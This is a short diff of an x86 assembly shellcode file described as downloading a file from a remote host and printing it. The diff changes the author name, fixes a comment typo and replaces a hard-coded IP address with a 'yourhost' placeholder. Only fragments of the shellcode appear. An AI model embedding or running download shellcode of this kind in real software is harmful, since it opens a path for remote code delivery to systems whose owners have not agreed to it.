@@ -1,5 +1,5 @@
 ;/***********************************************************************/
-;/*Author	: Me							*/
+;/*Author	: DaBDouB-MosiKaR							*/
 ;/*Date		: 27/05							*/
 ;/*Desc		: Download then read and print to the screen		*/
 ;/***********************************************************************/
@@ -48,7 +48,7 @@ shellcode:
 	int 0x80
 	
 
-	;Wrtie
+	;Write
 	xchg edx, eax
 	push 0x01
 	pop ebx
@@ -89,4 +89,4 @@ Child:
 
 call_shellcode:
 	call shellcode
-	lien:		db	"http://81.192.48.152/rtfm/echo.txt"
+	lien:		db	"http://yourhost/echo.txt"
